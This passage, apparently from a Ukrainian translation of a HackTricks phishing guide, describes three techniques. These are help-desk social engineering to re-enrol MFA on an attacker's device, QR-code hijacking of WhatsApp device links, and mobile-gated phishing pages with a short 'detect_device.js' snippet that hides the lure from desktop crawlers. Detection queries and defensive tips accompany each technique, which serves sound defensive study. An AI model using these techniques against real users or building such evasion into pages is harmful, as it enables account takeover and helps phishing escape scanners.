Окрім класичного push-bombing, оператори просто **примусово реєструють MFA заново** під час дзвінка до help desk, знецінюючи наявний токен користувача.  Будь-який наступний login prompt здається жертві легітимним.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Моніторте події AzureAD/AWS/Okta, у яких **`deleteMFA` + `addMFA`** відбуваються **протягом кількох хвилин з тієї самої IP-адреси**.



## Clipboard Hijacking / Pastejacking

Зловмисники можуть непомітно скопіювати шкідливі команди в буфер обміну жертви зі скомпрометованої або typosquatted вебсторінки, а потім змусити користувача вставити їх у **Win + R**, **Win + X** або вікно термінала, виконавши довільний код без завантаження чи вкладення.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Викрадення прив’язки пристрою WhatsApp через соціальну інженерію з QR-кодом
* Сторінка-приманка (наприклад, фальшивий “канал” міністерства/CERT) відображає QR-код WhatsApp Web/Desktop і вказує жертві відсканувати його, непомітно додаючи зловмисника як **прив’язаний пристрій**.<sup>[[12]](#references)</sup>
* Зловмисник одразу отримує видимість чатів і контактів, доки сесію не буде видалено. Пізніше жертви можуть побачити сповіщення “новий пристрій прив’язано”; захисники можуть шукати неочікувані події прив’язки пристроїв, що сталися невдовзі після відвідування ненадійних QR-сторінок.

### Mobile‑gated phishing для обходу crawler/sandbox
Оператори дедалі частіше обмежують свої phishing-потоки простою перевіркою пристрою, щоб desktop crawler ніколи не досягав фінальних сторінок. Поширений шаблон — невеликий скрипт, який перевіряє наявність DOM із підтримкою сенсорного введення та надсилає результат на endpoint сервера; non‑mobile clients отримують HTTP 500 (або порожню сторінку), тоді як mobile users бачать повний потік.<sup>[[7]](#references)</sup>

Мінімальний клієнтський фрагмент (типова логіка):
```html
<script src="/static/detect_device.js"></script>
```
Логіка `detect_device.js` (спрощено):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Поведінка сервера, яка часто спостерігається:
- Встановлює session cookie під час першого завантаження.
- Приймає `POST /detect {"is_mobile":true|false}`.
- Повертає 500 (або placeholder) для наступних GET-запитів, коли `is_mobile=false`; обслуговує phishing лише якщо значення `true`.

Евристики пошуку та виявлення:
- Запит urlscan: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: послідовність `GET /static/detect_device.js` → `POST /detect` → HTTP 500 для не-мобільних клієнтів; легітимні шляхи мобільних жертв повертають 200 із подальшим HTML/JS.
- Блокуйте або ретельно перевіряйте сторінки, які визначають вміст виключно за `ontouchstart` або подібними перевірками пристрою.

Поради із захисту:
- Запускайте crawlers із mobile-подібними fingerprint і ввімкненим JS, щоб виявляти gated content.
- Створюйте alert у разі підозрілих відповідей 500 після `POST /detect` на нещодавно зареєстрованих доменах.

## References

- [1] [Генерування варіантів доменів, що використовуються у phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Пошук phishing: інструменти й методи (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Крадіжка облікових даних і обхід 2FA за допомогою noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Крадіжка сесій і обхід 2FA за допомогою EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Як встановити й налаштувати DKIM із Postfix на Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Глобальний звіт Unit 42 про реагування на інциденти за 2025 рік — видання про social engineering](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing — mobile-gated phishing infrastructure та евристики (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Наступний рубіж атак зі складанням під час виконання: використання LLM для генерації phishing JavaScript у реальному часі](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Імітація особи, перехоплення кліків і TDS: усередині екосистеми розповсюдження malware](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Перехоплення traffic до Microsoft windows.com за допомогою bitflipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Кохання? Насправді: підробний dating app, використаний як приманка в цільовій spyware-кампанії в Пакистані](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [IoC і зразки ESET GhostChat](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
